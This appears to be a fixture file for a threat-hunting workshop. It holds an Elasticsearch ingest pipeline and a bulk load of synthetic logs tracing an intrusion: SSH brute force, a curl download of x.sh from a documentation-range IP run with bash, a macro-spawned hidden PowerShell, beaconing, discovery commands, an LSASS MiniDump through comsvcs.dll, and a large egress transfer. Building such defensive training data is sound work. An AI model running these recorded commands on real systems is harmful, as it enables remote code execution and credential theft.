# The lab dataset, `logs-lab-default` — the setup of the workshops — that the examples of several chapters query. The fixtures of those chapters are links to this file.

```json
PUT /_ingest/pipeline/lab-replay
{
  "description": "Rejoue le jeu de données du lab : décale les événements pour que le dernier ait eu lieu il y a 10 minutes",
  "processors": [
    {
      "script": {
        "source": "ZonedDateTime ts = ZonedDateTime.parse(ctx['@timestamp']); long ms = ChronoUnit.MILLIS.between(ts, ZonedDateTime.parse(params.end)); ctx['@timestamp'] = metadata().now.minus(ms, ChronoUnit.MILLIS).toString();",
        "params": { "end": "2026-10-01T10:30:00Z" }
      }
    }
  ]
}

POST /logs-lab-default/_bulk?pipeline=lab-replay&refresh
{"create":{}}
{"@timestamp":"2026-10-01T07:55:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"deploy"},"source":{"ip":"10.0.0.12"},"message":"Accepted publickey for deploy from 10.0.0.12 port 40022 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52311 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52321 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:20Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52331 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:30Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52341 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:00:40Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"failure","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Failed password for admin from 203.0.113.50 port 52351 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:01:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["authentication"],"type":["start"],"outcome":"success","dataset":"system.auth"},"user":{"name":"admin"},"source":{"ip":"203.0.113.50"},"message":"Accepted password for admin from 203.0.113.50 port 52400 ssh2"}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"curl","command_line":"curl -s http://198.51.100.7/x.sh -o /tmp/x.sh","pid":4101,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:02:10Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"bash","command_line":"bash /tmp/x.sh","pid":4102,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T08:03:00Z","host":{"name":"web-01","os":{"family":"linux"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"admin"},"process":{"name":"crontab","command_line":"crontab -l","pid":4110,"parent":{"name":"bash"}}}
{"create":{}}
{"@timestamp":"2026-10-01T09:58:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"winword.exe","command_line":"\"C:\\Program Files\\Microsoft Office\\WINWORD.EXE\" /n invoice.docm","pid":7001,"parent":{"name":"explorer.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"powershell.exe","command_line":"powershell.exe -nop -w hidden -enc SQBFAFgA","pid":7300,"parent":{"name":"winword.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:00:05Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"updater.exe","command_line":"C:\\Users\\alice\\AppData\\Local\\Temp\\updater.exe","pid":7312,"parent":{"name":"powershell.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:01:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:02:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:04:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:05:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:06:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":512},"destination":{"ip":"198.51.100.7","port":443,"bytes":1024},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:03:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"chrome.exe","pid":5120},"source":{"ip":"10.0.0.42","bytes":2048},"destination":{"ip":"142.250.74.110","port":443,"bytes":88000},"network":{"transport":"tcp","direction":"egress"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"whoami.exe","command_line":"whoami /all","pid":7350,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:12:30Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"alice"},"process":{"name":"net.exe","command_line":"net group \"Domain Admins\" /domain","pid":7351,"parent":{"name":"updater.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:15:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":4096},"destination":{"ip":"10.0.0.20","port":445,"bytes":1024},"network":{"transport":"tcp","direction":"internal"}}
{"create":{}}
{"@timestamp":"2026-10-01T10:16:00Z","host":{"name":"db-01","os":{"family":"windows"}},"event":{"category":["process"],"type":["start"],"dataset":"endpoint.events.process"},"user":{"name":"svc_backup"},"process":{"name":"rundll32.exe","command_line":"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\l.dmp full","pid":8800,"parent":{"name":"services.exe"}}}
{"create":{}}
{"@timestamp":"2026-10-01T10:20:00Z","host":{"name":"ws-02","os":{"family":"windows"}},"event":{"category":["network"],"type":["connection"],"dataset":"endpoint.events.network"},"user":{"name":"alice"},"process":{"name":"updater.exe","pid":7312},"source":{"ip":"10.0.0.42","bytes":48000000},"destination":{"ip":"198.51.100.7","port":443,"bytes":2048},"network":{"transport":"tcp","direction":"egress"}}
```
